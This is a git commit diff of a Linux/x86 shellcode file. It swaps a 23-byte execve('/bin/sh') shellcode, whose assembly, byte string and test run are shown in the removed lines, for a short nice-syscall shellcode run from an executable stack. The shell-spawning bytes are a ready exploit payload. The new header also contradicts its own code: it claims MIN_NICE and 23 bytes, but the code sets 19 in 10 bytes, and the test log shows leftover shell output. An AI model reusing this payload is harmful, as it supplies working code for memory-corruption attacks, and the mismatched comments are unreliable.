90fa16096c7f063f72a92ce7b6c97c1488f900c0
Hanks.Wang <byhankswang@gmail.com>
2016-01-04 16:07:55 +0800

    Just code commit for backup

--- nice.c
+++ nice.c
@@ -1,79 +1,49 @@
 /*
-@Title: Linux/x86 execve("/bin/sh");23 bytes shellcode
-@Date: 2015-12-21
+@Linux/x86 nice(MIN_NICE),23 bytes shellcode
+@Date: 2016-01-04
 @Author: byhankswang
 @Contact: byhankswang@gmail.com
 @Site: http://blog.csdn.net/byhankswang
 @Tested on: x86-32/i686 ubuntu-14.04 Kernel-3.19.0-25-generic 
 
-@what we want to do:
-#include <stdio.h>
-
-    void main(void)
-    {
-
-        char *sc[2];
-        sc[0] = "/bin/sh";
-        sc[1] = NULL;
-
-        execve( sc[0], 0, 0);
-    }
-
 @nice value is defined in linux/include/linux/sched/prio.h 
     #define MAX_NICE	19
     #define MIN_NICE	-20
 
-@assembly to realize the above code
+@assembly to realize nice syscall
 
     08048054 <_start>:
      8048054:       31 c0                   xor    %eax,%eax
-     8048056:       50                      push   %eax
-     8048057:       68 6e 2f 73 68          push   $0x68732f6e
-     804805c:       68 2f 2f 62 69          push   $0x69622f2f
-     8048061:       89 e3                   mov    %esp,%ebx
-     8048063:       50                      push   %eax
-     8048064:       53                      push   %ebx
-     8048065:       89 e1                   mov    %esp,%ecx
-     8048067:       b0 0b                   mov    $0xb,%al
-     8048069:       cd 80                   int    $0x80
+     8048056:       31 db                   xor    %ebx,%ebx
+     8048058:       b0 22                   mov    $0x22,%al
+     804805a:       b3 13                   mov    $0x13,%bl
+     804805c:       cd 80                   int    $0x80
 
 @testing results
-    byhankswang@vubuntu32:~$ uname -a
-    Linux vubuntu32 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+    byhankswang@vubuntu32:~$ gcc -fno-stack-protector -z execstack -o nice nice.c
     byhankswang@vubuntu32:~$
-    byhankswang@vubuntu32:~$ cat /etc/os-release
-    NAME="Ubuntu"
-    VERSION="14.04.3 LTS, Trusty Tahr"
-    ID=ubuntu
-    ID_LIKE=debian
-    PRETTY_NAME="Ubuntu 14.04.3 LTS"
-    VERSION_ID="14.04"
-    HOME_URL="http://www.ubuntu.com/"
-    SUPPORT_URL="http://help.ubuntu.com/"
-    BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
-    byhankswang@vubuntu32:~$
-    byhankswang@vubuntu32:~$ gcc -fno-stack-protector -z execstack -o bin_sh bin_sh.c
-    byhankswang@vubuntu32:~$
-    byhankswang@vubuntu32:~$ ./bin_sh
+    byhankswang@vubuntu32:~$ sudo ./nice
     $
     $ env
     PWD=/home/byhankswang
     $ exit
     byhankswang@vubuntu32:~$
-
 */
 
 
-
 #include <stdio.h>
+#include <unistd.h>
 #include <sys/time.h>
 #include <sys/resource.h>
 
 int main(void)
 {
 
-    //getpriority()
-    char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+    int prio = 18;
+    prio = getpriority(PRIO_PROCESS, 0);
+    printf("priority of this process is %d\n", prio);
+    char shellcode[] = "\x31\xc0\x31\xdb\xb0\x22\xb3\x13\xcd\x80";
     (*(void(*)())shellcode)();
-    //getpriority()
+    prio = getpriority(PRIO_PROCESS, 0);
+    printf("priority of this process is %d\n", prio);
 }
